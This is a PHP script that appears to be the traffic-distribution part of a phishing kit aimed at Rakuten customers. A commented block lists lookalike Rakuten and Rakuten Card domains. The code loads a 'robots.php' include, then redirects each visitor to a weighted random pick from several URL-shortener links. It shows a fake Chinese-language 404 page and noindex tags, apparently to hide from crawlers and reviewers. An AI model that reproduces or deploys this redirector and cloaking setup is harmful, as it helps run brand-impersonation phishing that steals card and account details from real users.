<?php
include('robots.php');
/*
session_start();
if($_SESSION['code']){//如果是二次触发，脚bai本du阻断算求
    exit('任务已zhi经建立');
}
$code = mt_rand(1,1000);
$_SESSION['code'] = $code;

rakuten-2.xyz	80	
rakuten-1.xyz	80	
rakuten-japan.website	80	
rakuten-japan.space	80	
rakuten-jp.website	80	
rakuten-jp.space
rakuten-2.website    
rakuten1.website
rakuten-2.space
rakutencard.co
rakuten-card-mail.co
rakuten-card-mail.com

*/



$urldata = array(
    array('url'=>'http://mrw.so/5QvuGN',      'weights'=>1),
    array('url'=>'http://s.id/nwniK',              'weights'=>2),
    array('url'=>'http://6tt.co/sS5V',  'weights'=>3),
    array('url'=>'http://33h.co/fLcb',  'weights'=>4),
    array('url'=>'http://8nn.co/b8Ff',  'weights'=>5),
    array('url'=>'http://8rr.co/JtyY',  'weights'=>6)
    
    #array('url'=>'http://japan-rakuten.website',             'weights'=>0),
   
);

$tzurlarr = getConsultant($urldata);
$tz_url = $tzurlarr['url'];
echo $tz_url;

#$t_url = ['japan-rakuten.website'];


#header("location:".$t_url);
header("location:".$tz_url);

function getConsultant(array $data){
    $weight = 0;
    $users = array();
    foreach ($data as $one) {
        $oneWeight = (int)$one['weights'] ? $one['weights'] : 1;
        $weight += $oneWeight;
        for ($i = 0; $i < $oneWeight; $i ++) {
            $users[] = $one;
        }
    }
    return $users[rand(0, $weight-1)];
}


#<script language="javascript" type="text/javascript">
    
#        setTimeout(function(){
#            var arr=['http://wb.mlhd.org','http://www.jiaying666.com','http://www.baidu.com'];
#            window.location.href=arr[parseInt(Math.random()*arr.length)];
#        },100);
 
#    </script>

#    <body οnlοad="javascript:dogo();">
#    </body>

?>

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:pt="http://xmlns.jcp.org/jsf/passthrough">
    <head>
        <meta name="googlebot" content="noindex">
        <META NAME="ROBOTS" CONTENT="NOINDEX,NOFOLLOW">
        <meta name="ROBOTS" content="NOINDEX,NOFOLLOW">
    </head>
    <body>
        <h3>404，您请求的文件不存在!</h3>
    </body>
</html>
